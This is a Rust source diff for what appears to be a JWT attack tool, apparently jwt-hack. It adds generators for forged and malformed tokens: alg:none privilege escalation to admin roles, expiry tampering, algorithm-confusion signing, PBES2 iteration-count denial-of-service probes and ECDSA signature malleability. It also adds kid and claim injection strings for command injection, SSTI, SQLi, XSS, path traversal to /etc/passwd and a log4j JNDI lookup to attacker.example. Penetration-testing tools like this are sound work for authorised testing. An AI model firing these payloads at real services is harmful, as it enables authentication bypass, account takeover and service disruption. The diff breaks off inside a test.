@@ -36,6 +36,29 @@ fn sign_hs256(input: &str, secret: &[u8]) -> String {
     format!("{input}.{sig_b64}")
 }
 
+/// Sign a `header.payload` input with an HMAC algorithm and a raw secret,
+/// returning the base64url-encoded signature only.
+fn sign_hmac(input: &str, secret: &[u8], alg: &str) -> Result<String> {
+    let sig = match alg {
+        "HS256" => {
+            let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
+            let out = general_purpose::URL_SAFE_NO_PAD.encode(m.as_slice());
+            m.zeroize();
+            out
+        }
+        other => {
+            let algo = match other {
+                "HS384" => jsonwebtoken::Algorithm::HS384,
+                _ => jsonwebtoken::Algorithm::HS512,
+            };
+            let key = jsonwebtoken::EncodingKey::from_secret(secret);
+            // jsonwebtoken returns the base64url-encoded signature directly.
+            jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?
+        }
+    };
+    Ok(sig)
+}
+
 /// Read the original `alg` value from a JWT header (without verifying anything).
 fn original_alg(token: &str) -> Option<String> {
     let parts: Vec<&str> = token.split('.').collect();
@@ -146,25 +169,25 @@ pub fn generate_alg_confusion_payload(
     let hmac_header = json!({ "alg": hmac_target, "typ": "JWT" });
     match public_key {
         Some(pem) => {
+            // Real-world alg-confusion frequently fails because the HMAC secret
+            // must be the EXACT public-key bytes the server uses, and PEM
+            // formatting (trailing newline, CRLF) differs between stacks. Emit
+            // one signed token per common byte normalization to maximise hits.
             let input = build_signing_input(&hmac_header, claims_part)?;
-            let sig_b64 = match hmac_target {
-                "HS256" => {
-                    let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
-                    let out = general_purpose::URL_SAFE_NO_PAD.encode(m.as_slice());
-                    m.zeroize();
-                    out
+            let trimmed = pem.trim_end_matches(['\n', '\r']);
+            let key_variants: [Vec<u8>; 3] = [
+                pem.as_bytes().to_vec(),             // exactly as provided
+                format!("{trimmed}\n").into_bytes(), // normalised trailing LF
+                trimmed.as_bytes().to_vec(),         // no trailing newline
+            ];
+            let mut seen = std::collections::HashSet::new();
+            for secret in key_variants {
+                if !seen.insert(secret.clone()) {
+                    continue;
                 }
-                other => {
-                    let algo = match other {
-                        "HS384" => jsonwebtoken::Algorithm::HS384,
-                        _ => jsonwebtoken::Algorithm::HS512,
-                    };
-                    let key = jsonwebtoken::EncodingKey::from_secret(pem.as_bytes());
-                    // jsonwebtoken returns the base64url-encoded signature directly.
-                    jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?
-                }
-            };
-            payloads.push(format!("{input}.{sig_b64}"));
+                let sig_b64 = sign_hmac(&input, &secret, hmac_target)?;
+                payloads.push(format!("{input}.{sig_b64}"));
+            }
         }
         None => {
             payloads.push(encode_header_with_claims(&hmac_header, claims_part)?);
@@ -1096,6 +1119,547 @@ pub fn generate_kid_wildcard_payload(token: &str) -> Result<Vec<String>> {
     Ok(payloads)
 }
 
+/// Decode the claims (payload) segment of a JWT into a JSON value.
+fn extract_claims_value(token: &str) -> Result<serde_json::Value> {
+    let claims_part = extract_claims_part(token)?;
+    let bytes = general_purpose::URL_SAFE_NO_PAD
+        .decode(claims_part)
+        .map_err(|e| anyhow::anyhow!("Failed to base64-decode claims: {e}"))?;
+    serde_json::from_slice(&bytes).map_err(|e| anyhow::anyhow!("Claims are not valid JSON: {e}"))
+}
+
+/// Decode the claims segment as a JSON object map (empty map if not an object).
+fn extract_claims_map(token: &str) -> Result<serde_json::Map<String, serde_json::Value>> {
+    Ok(extract_claims_value(token)?
+        .as_object()
+        .cloned()
+        .unwrap_or_default())
+}
+
+/// Build a 2-part `alg:none` token (header.payload) carrying the given claims map.
+fn none_token_from_claims(claims: &serde_json::Map<String, serde_json::Value>) -> Result<String> {
+    let header = json!({ "alg": "none", "typ": "JWT" });
+    let header_b64 =
+        general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&header)?.as_bytes());
+    let claims_json = serde_json::to_string(&serde_json::Value::Object(claims.clone()))?;
+    let claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(claims_json.as_bytes());
+    Ok(format!("{header_b64}.{claims_b64}"))
+}
+
+/// Generate claim privilege-escalation payloads.
+///
+/// Each variant clones the original claims and injects or overrides a
+/// role-like field with an elevated value, covering the common shapes seen
+/// across frameworks (`role`, `roles`, `scope`/`scp`, `admin`/`isAdmin`,
+/// Spring `authorities`, etc.). Tokens are emitted as `alg:none`, so they
+/// target servers already vulnerable to a signature bypass; pair with the
+/// `encode` command once a signing key is recovered to produce signed
+/// variants of the same claim set.
+pub fn generate_claims_privesc_payload(token: &str) -> Result<Vec<String>> {
+    let base = extract_claims_map(token)?;
+
+    let escalations: Vec<(&str, serde_json::Value)> = vec![
+        ("role", json!("admin")),
+        ("role", json!("administrator")),
+        ("role", json!("superadmin")),
+        ("role", json!("root")),
+        ("roles", json!(["admin"])),
+        ("roles", json!(["admin", "user"])),
+        ("scope", json!("admin")),
+        ("scp", json!(["admin"])),
+        ("admin", json!(true)),
+        ("isAdmin", json!(true)),
+        ("is_admin", json!(true)),
+        ("groups", json!(["admin", "administrators"])),
+        ("authorities", json!(["ROLE_ADMIN"])),
+        ("permissions", json!(["*"])),
+        ("user_type", json!("admin")),
+        ("userType", json!("admin")),
+    ];
+
+    let mut payloads = Vec::with_capacity(escalations.len());
+    for (key, value) in escalations {
+        let mut claims = base.clone();
+        claims.insert(key.to_string(), value);
+        payloads.push(none_token_from_claims(&claims)?);
+    }
+    info!("Generated claim privilege-escalation payloads (alg:none)");
+    Ok(payloads)
+}
+
+/// Generate expiry / `nbf` / `iat` manipulation payloads.
+///
+/// Removes or extends lifetime claims and probes numeric type-confusion
+/// (string vs int, overflow, negative, zero) in servers that compare time
+/// claims loosely. Emitted as `alg:none`.
+pub fn generate_claims_exp_payload(token: &str) -> Result<Vec<String>> {
+    let base = extract_claims_map(token)?;
+    let mut payloads = Vec::new();
+
+    // 253402300799 == 9999-12-31T23:59:59Z.
+    let far_future = 253402300799i64;
+
+    // (mutation label used only for readability) -> claim map mutation.
+    // exp removed entirely.
+    {
+        let mut c = base.clone();
+        c.remove("exp");
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // exp far in the future.
+    {
+        let mut c = base.clone();
+        c.insert("exp".into(), json!(far_future));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // exp as a numeric string (type juggling).
+    {
+        let mut c = base.clone();
+        c.insert("exp".into(), json!(far_future.to_string()));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // exp = i64::MAX (overflow probing).
+    {
+        let mut c = base.clone();
+        c.insert("exp".into(), json!(i64::MAX));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // exp = 0.
+    {
+        let mut c = base.clone();
+        c.insert("exp".into(), json!(0));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // exp = -1.
+    {
+        let mut c = base.clone();
+        c.insert("exp".into(), json!(-1));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // nbf removed.
+    {
+        let mut c = base.clone();
+        c.remove("nbf");
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // nbf far in the past.
+    {
+        let mut c = base.clone();
+        c.insert("nbf".into(), json!(0));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // iat far in the future.
+    {
+        let mut c = base.clone();
+        c.insert("iat".into(), json!(far_future));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+
+    info!("Generated claim exp/nbf/iat manipulation payloads (alg:none)");
+    Ok(payloads)
+}
+
+/// Generate issuer / audience / subject confusion payloads.
+///
+/// Swaps `aud` between string and array forms, injects a wildcard, toggles
+/// `iss`, and type-juggles `sub` — useful against cross-service token reuse
+/// and authorization checks that trust these claims. Also emits a raw
+/// duplicate-key claims body (`"role":"user","role":"admin"`) to probe parser
+/// divergence in the payload segment (mirrors the header-level `dup_key`
+/// attack). Emitted as `alg:none`.
+pub fn generate_claims_confusion_payload(token: &str) -> Result<Vec<String>> {
+    let base = extract_claims_map(token)?;
+    let mut payloads = Vec::new();
+
+    // --- aud confusion: string <-> array swap based on current shape ---
+    {
+        let mut c = base.clone();
+        match c.get("aud").cloned() {
+            Some(serde_json::Value::String(s)) => {
+                c.insert("aud".into(), json!([s]));
+            }
+            Some(serde_json::Value::Array(a)) => {
+                if let Some(first) = a.into_iter().next() {
+                    c.insert("aud".into(), first);
+                }
+            }
+            _ => {
+                c.insert("aud".into(), json!("*"));
+            }
+        }
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // aud wildcard.
+    {
+        let mut c = base.clone();
+        c.insert("aud".into(), json!("*"));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    // aud removed.
+    {
+        let mut c = base.clone();
+        c.remove("aud");
+        payloads.push(none_token_from_claims(&c)?);
+    }
+
+    // --- iss confusion ---
+    {
+        let mut c = base.clone();
+        c.remove("iss");
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    if let Some(serde_json::Value::String(iss)) = base.get("iss") {
+        // trailing-slash variant.
+        let mut c = base.clone();
+        c.insert("iss".into(), json!(format!("{iss}/")));
+        payloads.push(none_token_from_claims(&c)?);
+        // uppercased variant.
+        let mut c2 = base.clone();
+        c2.insert("iss".into(), json!(iss.to_uppercase()));
+        payloads.push(none_token_from_claims(&c2)?);
+    }
+
+    // --- sub type juggling ---
+    for sub in [
+        serde_json::Value::Null,
+        json!(0),
+        json!("0"),
+        json!("admin"),
+        json!(["admin"]),
+    ] {
+        let mut c = base.clone();
+        c.insert("sub".into(), sub);
+        payloads.push(none_token_from_claims(&c)?);
+    }
+
+    // --- raw duplicate-key claims body ---
+    {
+        let header = json!({ "alg": "none", "typ": "JWT" });
+        let header_b64 =
+            general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&header)?.as_bytes());
+        let inner = serde_json::to_string(&serde_json::Value::Object(base.clone()))?;
+        let dup = if base.is_empty() {
+            r#"{"role":"user","role":"admin"}"#.to_string()
+        } else {
+            // Strip the trailing '}' and append duplicate role keys.
+            format!(
+                "{},\"role\":\"user\",\"role\":\"admin\"}}",
+                &inner[..inner.len() - 1]
+            )
+        };
+        let claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(dup.as_bytes());
+        payloads.push(format!("{header_b64}.{claims_b64}"));
+    }
+
+    info!("Generated claim iss/aud/sub confusion payloads (alg:none)");
+    Ok(payloads)
+}
+
+/// Build a 5-segment JWE compact token: `protected.encrypted_key.iv.ciphertext.tag`.
+///
+/// `iv`/`tag` are zero-filled placeholders and `ciphertext` reuses the source
+/// token's claims segment. These are **probes**, not validly-encrypted tokens —
+/// the value is the server's differential / DoS response on its JWE code path.
+fn jwe_probe_token(
+    protected: &serde_json::Value,
+    encrypted_key: &str,
+    ciphertext: &str,
+) -> Result<String> {
+    let ph = general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(protected)?.as_bytes());
+    let iv = general_purpose::URL_SAFE_NO_PAD.encode([0u8; 12]);
+    let tag = general_purpose::URL_SAFE_NO_PAD.encode([0u8; 16]);
+    Ok(format!("{ph}.{encrypted_key}.{iv}.{ciphertext}.{tag}"))
+}
+
+/// Generate JWE (encrypted JWT) header-confusion and DoS probe payloads.
+///
+/// jwt-hack's primary surface is JWS; this emits JWE-shaped probe tokens that
+/// exercise a server's *encrypted*-token code path without performing real
+/// encryption (which would need a key or a decryption oracle — tracked
+/// separately). Covers:
+///   - PBES2 `p2c` iteration-count DoS (huge key-derivation cost)
+///   - `alg:dir` direct-key confusion (empty encrypted key segment)
+///   - key-management `alg` downgrades (RSA1_5, A128KW, ECDH-ES, …)
+///   - ECDH-ES invalid-curve `epk` injection (off-curve public point)
+///   - JWS/JWE type confusion (a JWS-shaped token carrying an `enc` header)
+///
+/// The claims segment of the input token is reused as placeholder ciphertext
+/// and `iv`/`tag` are zero-filled. Interpret results by the server's response
+/// (500 vs 400, latency spikes for `p2c`), not by successful decryption.
+pub fn generate_jwe_probe_payload(token: &str) -> Result<Vec<String>> {
+    let claims_ct = extract_claims_part(token)?; // placeholder ciphertext
+    let dummy_ek = general_purpose::URL_SAFE_NO_PAD.encode([0u8; 32]);
+    // Fixed PBES2 salt placeholder (real attacks vary this; DoS only needs p2c).
+    let p2s = general_purpose::URL_SAFE_NO_PAD.encode([0x13u8; 16]);
+
+    let mut payloads = Vec::new();
+
+    // --- PBES2 p2c iteration-count DoS ---
+    for p2c in [1_000_000u64, 10_000_000, 100_000_000] {
+        let header = json!({
+            "alg": "PBES2-HS256+A128KW",
+            "enc": "A128CBC-HS256",
+            "p2s": p2s,
+            "p2c": p2c,
+        });
+        payloads.push(jwe_probe_token(&header, &dummy_ek, claims_ct)?);
+    }
+
+    // --- alg:dir direct-key confusion (empty encrypted_key segment) ---
+    for enc in ["A128GCM", "A256GCM", "A128CBC-HS256"] {
+        let header = json!({ "alg": "dir", "enc": enc });
+        payloads.push(jwe_probe_token(&header, "", claims_ct)?);
+    }
+
+    // --- key-management alg downgrades ---
+    for alg in [
+        "RSA1_5",
+        "RSA-OAEP",
+        "RSA-OAEP-256",
+        "A128KW",
+        "A256KW",
+        "A128GCMKW",
+        "ECDH-ES",
+        "ECDH-ES+A128KW",
+    ] {
+        let header = json!({ "alg": alg, "enc": "A256GCM" });
+        payloads.push(jwe_probe_token(&header, &dummy_ek, claims_ct)?);
+    }
+
+    // --- ECDH-ES invalid-curve epk injection (off-curve probe point) ---
+    let bad_x = general_purpose::URL_SAFE_NO_PAD.encode([0x01u8; 32]);
+    let bad_y = general_purpose::URL_SAFE_NO_PAD.encode([0x01u8; 32]);
+    let epk = json!({ "kty": "EC", "crv": "P-256", "x": bad_x, "y": bad_y });
+    let header = json!({ "alg": "ECDH-ES", "enc": "A128GCM", "epk": epk });
+    payloads.push(jwe_probe_token(&header, "", claims_ct)?);
+
+    // --- JWS/JWE type confusion: a 3-part JWS carrying an `enc` header ---
+    {
+        let header = json!({ "alg": "HS256", "enc": "A256GCM", "typ": "JWT" });
+        let hb =
+            general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&header)?.as_bytes());
+        payloads.push(format!("{hb}.{claims_ct}."));
+    }
+
+    info!("Generated JWE header-confusion / PBES2 DoS probe payloads");
+    Ok(payloads)
+}
+
+// NIST curve group orders (n), big-endian hex — constant per curve.
+const P256_ORDER_HEX: &str = "FFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551";
+const P384_ORDER_HEX: &str = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973";
+const P521_ORDER_HEX: &str = "01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409";
+
+/// Left-pad (or return as-is) a big-endian byte vector to `size` bytes.
+fn left_pad_to(mut bytes: Vec<u8>, size: usize) -> Vec<u8> {
+    if bytes.len() >= size {
+        bytes
+    } else {
+        let mut out = vec![0u8; size - bytes.len()];
+        out.append(&mut bytes);
+        out
+    }
+}
+
+/// Generate signature malleability / structural signature probe payloads.
+///
+/// For **ECDSA** tokens (ES256/384/512) this produces a genuinely valid
+/// alternative signature via the classic `s' = n - s` high-S malleability:
+/// verifiers that don't enforce low-S (e.g. OpenSSL's default `ECDSA_verify`,
+/// unlike ring) accept it for the *same* message. It also emits a DER-encoded
+/// signature variant, since JWS mandates raw `r||s` and some libraries wrongly
+/// accept the DER (ASN.1) form.
+///
+/// For any signed token it additionally emits structural probes — all-zero
+/// signature, truncated signature, and a trailing-byte-extended signature —
+/// whose value is the verifier's differential response (accept / 500 / 400).
+pub fn generate_sig_malleability_payload(token: &str) -> Result<Vec<String>> {
+    let parts: Vec<&str> = token.split('.').collect();
+    if parts.len() < 2 {
+        return Err(anyhow::anyhow!("Invalid token format"));
+    }
+    let header = parts[0];
+    let claims = parts[1];
+    let sig_b64 = parts.get(2).copied().unwrap_or("");
+    let alg = original_alg(token).unwrap_or_default().to_uppercase();
+
+    let mut payloads = Vec::new();
+
+    // --- ECDSA high-S malleability + DER-encoding variants ---
+    if matches!(alg.as_str(), "ES256" | "ES384" | "ES512") {
+        if let Ok(sig) = general_purpose::URL_SAFE_NO_PAD.decode(sig_b64) {
+            let (order_hex, comp) = match alg.as_str() {
+                "ES256" => (P256_ORDER_HEX, 32usize),
+                "ES384" => (P384_ORDER_HEX, 48),
+                _ => (P521_ORDER_HEX, 66),
+            };
+            if sig.len() == comp * 2 {
+                use openssl::bn::BigNum;
+                use openssl::ecdsa::EcdsaSig;
+
+                let r = &sig[..comp];
+                let s = &sig[comp..];
+
+                // high-S variant: s' = n - s, re-assembled as raw r||s'.
+                if let (Ok(n), Ok(s_bn)) = (BigNum::from_hex_str(order_hex), BigNum::from_slice(s))
+                {
+                    let mut s2 = BigNum::new()?;
+                    if s2.checked_sub(&n, &s_bn).is_ok() {
+                        let s2_bytes = left_pad_to(s2.to_vec(), comp);
+                        let mut new_sig = Vec::with_capacity(comp * 2);
+                        new_sig.extend_from_slice(r);
+                        new_sig.extend_from_slice(&s2_bytes);
+                        payloads.push(format!(
+                            "{header}.{claims}.{}",
+                            general_purpose::URL_SAFE_NO_PAD.encode(&new_sig)
+                        ));
+                    }
+                }
+
+                // DER (ASN.1) encoded signature variant.
+                if let (Ok(r_bn), Ok(s_bn)) = (BigNum::from_slice(r), BigNum::from_slice(s)) {
+                    if let Ok(der) =
+                        EcdsaSig::from_private_components(r_bn, s_bn).and_then(|sig| sig.to_der())
+                    {
+                        payloads.push(format!(
+                            "{header}.{claims}.{}",
+                            general_purpose::URL_SAFE_NO_PAD.encode(&der)
+                        ));
+                    }
+                }
+            }
+        }
+    }
+
+    // --- Generic structural signature probes (any signed token) ---
+    if !sig_b64.is_empty() {
+        if let Ok(sig) = general_purpose::URL_SAFE_NO_PAD.decode(sig_b64) {
+            // All-zero signature of the same length.
+            let zeros = vec![0u8; sig.len().max(1)];
+            payloads.push(format!(
+                "{header}.{claims}.{}",
+                general_purpose::URL_SAFE_NO_PAD.encode(&zeros)
+            ));
+            // Truncated to half length.
+            if sig.len() > 2 {
+                let half = &sig[..sig.len() / 2];
+                payloads.push(format!(
+                    "{header}.{claims}.{}",
+                    general_purpose::URL_SAFE_NO_PAD.encode(half)
+                ));
+            }
+            // Extended with a trailing zero byte.
+            let mut ext = sig.clone();
+            ext.push(0);
+            payloads.push(format!(
+                "{header}.{claims}.{}",
+                general_purpose::URL_SAFE_NO_PAD.encode(&ext)
+            ));
+        }
+        // Single 0x00-byte signature.
+        payloads.push(format!(
+            "{header}.{claims}.{}",
+            general_purpose::URL_SAFE_NO_PAD.encode([0u8])
+        ));
+    }
+
+    info!("Generated signature malleability / structural probe payloads");
+    Ok(payloads)
+}
+
+/// Generate `kid` injection payloads beyond SQL (NoSQL / command / SSTI / LDAP / CRLF).
+///
+/// When a server resolves `kid` against a datastore, shell, template engine or
+/// directory before verifying the signature, an injectable `kid` reaches that
+/// sink. Complements [`generate_kid_sql_payload`] with the non-SQL injection
+/// classes, including JSON-object `kid` values for NoSQL operator injection.
+/// Emitted unsigned (header.payload) — the sink fires during key lookup.
+pub fn generate_kid_injection_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+    let mut payloads = Vec::new();
+
+    // String-valued kid injections.
+    let string_kids = [
+        // OS command injection
+        "key; id",
+        "key | id",
+        "key$(id)",
+        "key`id`",
+        "key; sleep 5",
+        "key\nid",
+        // Server-side template injection
+        "${7*7}",
+        "{{7*7}}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        // LDAP injection
+        "*)(uid=*))(|(uid=*",
+        "*",
+        // NoSQL (string context)
+        "' || '1'=='1",
+        // CRLF / header injection
+        "key\r\nX-Injected: jwt-hack",
+        "key%0d%0aX-Injected:jwt-hack",
+    ];
+    for kid in string_kids {
+        let header = json!({ "alg": "HS256", "typ": "JWT", "kid": kid });
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+
+    // Object-valued kid injections (NoSQL operator objects).
+    let object_kids = [
+        json!({ "$ne": serde_json::Value::Null }),
+        json!({ "$gt": "" }),
+        json!({ "$regex": ".*" }),
+    ];
+    for kv in object_kids {
+        let header = json!({ "alg": "HS256", "typ": "JWT", "kid": kv });
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+
+    info!("Generated kid injection payloads (NoSQL/command/SSTI/LDAP/CRLF)");
+    Ok(payloads)
+}
+
+/// Generate claim-value injection payloads.
+///
+/// Sprays common injection strings (XSS, SQLi, SSTI, path traversal, log4j
+/// JNDI, CRLF) into every string-valued claim plus a `name` claim, so that a
+/// downstream consumer reflecting any claim value into HTML, SQL, a template,
+/// logs, or an HTTP header is exercised. Emitted as `alg:none` so the tokens
+/// are usable once a signature bypass is in hand.
+pub fn generate_claim_injection_payload(token: &str) -> Result<Vec<String>> {
+    let base = extract_claims_map(token)?;
+
+    let injections = [
+        "<script>alert(1)</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "' OR '1'='1",
+        "1; DROP TABLE users--",
+        "${7*7}",
+        "{{7*7}}",
+        "#{7*7}",
+        "<%= 7*7 %>",
+        "../../../../etc/passwd",
+        "%0d%0aSet-Cookie: injected=1",
+        "${jndi:ldap://attacker.example/x}",
+    ];
+
+    let mut payloads = Vec::with_capacity(injections.len());
+    for inj in injections {
+        let mut c = base.clone();
+        for v in c.values_mut() {
+            if v.is_string() {
+                *v = json!(inj);
+            }
+        }
+        c.insert("name".into(), json!(inj));
+        payloads.push(none_token_from_claims(&c)?);
+    }
+    info!("Generated claim-value injection payloads (XSS/SQLi/SSTI/log4j/path, alg:none)");
+    Ok(payloads)
+}
+
 /// Generate all available payloads for a token
 pub fn generate_all_payloads(
     token: &str,
@@ -1103,6 +1667,7 @@ pub fn generate_all_payloads(
     jwk_attack: Option<&str>,
     jwk_protocol: &str,
     target: Option<&str>,
+    public_key: Option<&str>,
 ) -> Result<Vec<String>> {
     let mut payloads = Vec::new();
 
@@ -1140,7 +1705,7 @@ pub fn generate_all_payloads(
 
     // Algorithm confusion payloads
     if should_generate_all || targets.contains("alg_confusion") {
-        let alg_confusion_payloads = generate_alg_confusion_payload(token, None)?;
+        let alg_confusion_payloads = generate_alg_confusion_payload(token, public_key)?;
         payloads.extend(alg_confusion_payloads);
     }
 
@@ -1262,6 +1827,41 @@ pub fn generate_all_payloads(
     // kid empty/null/wildcard fallback
     if should_generate_all || targets.contains("kid_wildcard") {
         payloads.extend(generate_kid_wildcard_payload(token)?);
+    }
+
+    // Claim privilege escalation (role/scope/admin, alg:none)
+    if should_generate_all || targets.contains("claims_privesc") {
+        payloads.extend(generate_claims_privesc_payload(token)?);
+    }
+
+    // Claim exp/nbf/iat manipulation (alg:none)
+    if should_generate_all || targets.contains("claims_exp") {
+        payloads.extend(generate_claims_exp_payload(token)?);
+    }
+
+    // Claim iss/aud/sub confusion (alg:none)
+    if should_generate_all || targets.contains("claims_confusion") {
+        payloads.extend(generate_claims_confusion_payload(token)?);
+    }
+
+    // JWE header-confusion / PBES2 DoS probes
+    if should_generate_all || targets.contains("jwe") {
+        payloads.extend(generate_jwe_probe_payload(token)?);
+    }
+
+    // Signature malleability / structural signature probes
+    if should_generate_all || targets.contains("sig_malleability") {
+        payloads.extend(generate_sig_malleability_payload(token)?);
+    }
+
+    // kid injection beyond SQL (NoSQL/command/SSTI/LDAP/CRLF)
+    if should_generate_all || targets.contains("kid_injection") {
+        payloads.extend(generate_kid_injection_payload(token)?);
+    }
+
+    // Claim-value injection (XSS/SQLi/SSTI/log4j/path, alg:none)
+    if should_generate_all || targets.contains("claim_injection") {
+        payloads.extend(generate_claim_injection_payload(token)?);
     }
 
     Ok(payloads)
@@ -1507,7 +2107,7 @@ mod tests {
 
     #[test]
     fn test_generate_all_payloads_basic() {
-        let result = generate_all_payloads(DUMMY_TOKEN, None, None, "http", None);
+        let result = generate_all_payloads(DUMMY_TOKEN, None, None, "http", None, None);
         assert!(result.is_ok());
         let payloads = result.unwrap();
         // Expected: "none", "NonE", "NONE" + new attack payloads
@@ -1528,6 +2128,7 @@ mod tests {
             Some("victim.com"),
             Some("attacker.com"),
             "https",
+            None,
             None,
         );
         assert!(
@@ -1607,6 +2208,7 @@ mod tests {
             Some("attacker.com"),
             "https",
             Some("none"),
+            None,
         );
         assert!(result.is_ok());
         let payloads = result.unwrap();
@@ -1627,6 +2229,7 @@ mod tests {
             Some("attacker.com"),
             "https",
             Some("jku"),
+            None,
         );
         assert!(result.is_ok());
         let payloads = result.unwrap();
@@ -1647,6 +2250,7 @@ mod tests {
             Some("attacker.com"),
             "https",
             Some("none,x5u"),
+            None,
         );
         assert!(result.is_ok());
         let payloads = result.unwrap();
@@ -1675,6 +2279,7 @@ mod tests {
             None,
             "http",
             Some("alg_confusion,kid_sql"),
+            None,
         );
         assert!(result.is_ok());
         let payloads = result.unwrap();
@@ -1810,6 +2415,35 @@ mod tests {
         let expected = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
         let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
         assert_eq!(parts[2], expected_b64);
+    }
+
+    #[test]
+    fn test_alg_confusion_signs_multiple_key_normalizations() {
+        // A PEM without a trailing newline should yield signed tokens for both
+        // the as-provided bytes and the newline-normalized bytes.
+        let pem = "-----BEGIN PUBLIC KEY-----\nFAKE\n-----END PUBLIC KEY-----";
+        let payloads = generate_alg_confusion_payload(DUMMY_TOKEN, Some(pem)).unwrap();
+
+        let verify_with = |secret: &[u8]| -> bool {
+            payloads.iter().any(|p| {
+                let parts: Vec<&str> = p.split('.').collect();
+                if parts.len() != 3 {
+                    return false;
+                }
+                let input = format!("{}.{}", parts[0], parts[1]);
+                let mac = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
+                URL_SAFE_NO_PAD.encode(mac.as_slice()) == parts[2]
+            })
+        };
+
+        assert!(
+            verify_with(pem.as_bytes()),
+            "as-provided key variant missing"
+        );
+        assert!(
+            verify_with(format!("{pem}\n").as_bytes()),
+            "newline-normalized key variant missing"
+        );
     }
 
     #[test]
@@ -2140,6 +2774,197 @@ mod tests {
             let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
             assert_eq!(parts[2], expected_b64);
         }
+    }
+
+    fn decode_claims(token: &str) -> Value {
+        let claims_b64 = token.split('.').nth(1).expect("claims segment");
+        let bytes = URL_SAFE_NO_PAD.decode(claims_b64).expect("b64 claims");
+        serde_json::from_slice(&bytes).expect("json claims")
+    }
+
+    #[test]
+    fn test_claims_privesc_injects_role_admin_preserving_original() {
+        let payloads = generate_claims_privesc_payload(DUMMY_TOKEN).expect("privesc ok");
+        assert!(!payloads.is_empty());
+        // Every token is a 2-part alg:none token.
+        for p in &payloads {
+            assert_eq!(p.split('.').count(), 2, "expected header.payload only");
+            let h = get_header_from_token(p).expect("header");
+            assert_eq!(h.get("alg").unwrap().as_str().unwrap(), "none");
+        }
+        // At least one variant sets role=admin while preserving the original sub.
+        let found = payloads.iter().any(|p| {
+            let v = decode_claims(p);
+            v.get("role").and_then(|r| r.as_str()) == Some("admin")
+                && v.get("sub").and_then(|s| s.as_str()) == Some("1234567890")
+        });
+        assert!(found, "expected role=admin variant preserving original sub");
+    }
+
+    #[test]
+    fn test_claims_exp_covers_int_string_and_removal() {
+        let payloads = generate_claims_exp_payload(DUMMY_TOKEN).expect("exp ok");
+        let mut saw_far_int = false;
+        let mut saw_string = false;
+        for p in &payloads {
+            let v = decode_claims(p);
+            if let Some(exp) = v.get("exp") {
+                if exp.as_i64() == Some(253402300799) {
+                    saw_far_int = true;
+                }
+                if exp.is_string() {
+                    saw_string = true;
+                }
+            }
+        }
+        assert!(saw_far_int, "expected far-future int exp");
+        assert!(saw_string, "expected numeric-string exp (type juggling)");
+    }
+
+    #[test]
+    fn test_claims_confusion_emits_duplicate_role_key_body() {
+        let payloads = generate_claims_confusion_payload(DUMMY_TOKEN).expect("confusion ok");
+        // The raw duplicate-key body decodes to text with two "role" keys.
+        let dup = payloads.iter().any(|p| {
+            let claims_b64 = p.split('.').nth(1).unwrap();
+            let bytes = URL_SAFE_NO_PAD.decode(claims_b64).unwrap();
+            let s = String::from_utf8(bytes).unwrap();
+            s.matches("\"role\"").count() >= 2
+        });
+        assert!(dup, "expected a duplicate role-key claims body");
+        // sub type-juggling produces a null sub variant.
+        let null_sub = payloads
+            .iter()
+            .any(|p| decode_claims(p).get("sub") == Some(&Value::Null));
+        assert!(null_sub, "expected a null sub variant");
+    }
+
+    #[test]
+    fn test_kid_injection_covers_nosql_ssti_and_object_kid() {
+        let payloads = generate_kid_injection_payload(DUMMY_TOKEN).expect("kid inj ok");
+        let headers: Vec<Value> = payloads
+            .iter()
+            .filter_map(|p| get_header_from_token(p))
+            .collect();
+        // SSTI string kid present.
+        assert!(headers
+            .iter()
+            .any(|h| h.get("kid").and_then(|k| k.as_str()) == Some("{{7*7}}")));
+        // NoSQL operator object kid present.
+        assert!(headers.iter().any(|h| h
+            .get("kid")
+            .and_then(|k| k.as_object())
+            .map(|o| o.contains_key("$ne"))
+            .unwrap_or(false)));
+    }
+
+    #[test]
+    fn test_claim_injection_sprays_into_string_claims() {
+        let payloads = generate_claim_injection_payload(DUMMY_TOKEN).expect("claim inj ok");
+        // log4j JNDI payload lands in the name claim of some token.
+        let jndi = payloads.iter().any(|p| {
+            decode_claims(p).get("name").and_then(|n| n.as_str())
+                == Some("${jndi:ldap://attacker.example/x}")
+        });
+        assert!(jndi, "expected a log4j JNDI injection in name");
+        // Every token is alg:none.
+        for p in &payloads {
